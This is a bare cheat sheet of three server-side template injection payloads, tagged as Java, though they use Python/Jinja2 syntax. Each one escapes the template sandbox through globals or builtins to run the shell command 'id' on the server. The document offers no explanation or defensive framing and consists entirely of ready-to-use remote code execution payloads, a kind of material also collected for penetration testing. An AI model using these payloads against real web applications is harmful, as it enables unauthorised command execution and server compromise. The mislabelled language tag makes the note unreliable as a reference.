#SSTI #java

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

```
{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
```

To Check :
```
{%set h=lipsum.__builtins__%}{{h.__import__("os").popen("id").read()}}
```